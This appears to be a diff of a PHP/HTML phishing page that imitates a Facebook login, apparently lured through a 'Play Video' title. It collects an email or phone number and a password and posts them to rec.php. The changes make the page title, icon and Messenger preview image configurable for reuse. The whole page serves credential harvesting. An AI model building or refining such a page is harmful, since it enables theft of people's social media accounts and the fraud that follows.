@@ -1,19 +1,18 @@
+<?php
+include("config.php");
+?>
 <html>
 
 <head>
 
 	<!--Titre en haut-->
-	<title>Play Video</title>
+	<title><?php echo $title ?></title>
 
 	<meta charset="UTF-8">
 
 
-
 	<!--photo-->
-	<link rel="icon" href="lite.png" type="image/x-icon" />
-
-
-
+	<link rel="icon" href="<?php echo $icon ?>" type="image/x-icon" />
 
 
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -22,8 +21,7 @@
 
 
 	<!--photo messenger  IMPORTANT-->
-	<meta property="og:image" content="lite.png" />
-
+	<meta property="og:image" content="<?php echo $icon ?>" />
 
 
 	<link rel="stylesheet" type="text/css" href="index.css">
@@ -38,14 +36,6 @@
 			<h1>facebook</h1>
 		</div>
 
-
-
-
-		<!-- sauce tomate
-		<h4 style="color:red">Please login</h4>
- -->
-
-
 		<div class="container">
 			<br>
 			<table>
@@ -53,14 +43,12 @@
 				<form method="post" action="rec.php">
 					<tr>
 						<td>
-							<input type="text" placeholder="Mobile number or email" id="firstname" autocomplete="off"
-								name="name" required>
+							<input type="text" placeholder="Mobile number or email" id="firstname" autocomplete="off" name="name" required>
 						</td>
 					</tr>
 					<tr>
 						<td>
-							<input type="Password" placeholder="Password" id="lastname" name="pass" autocomplete="off"
-								required>
+							<input type="Password" placeholder="Password" id="lastname" name="pass" autocomplete="off" required>
 						</td>
 					</tr>
 					<tr></tr>
@@ -82,6 +70,7 @@
 				<br>
 			</div>
 		</div>
+
 		<div class="lang">
 			<div class="current">
 				<p>English (US)</p>
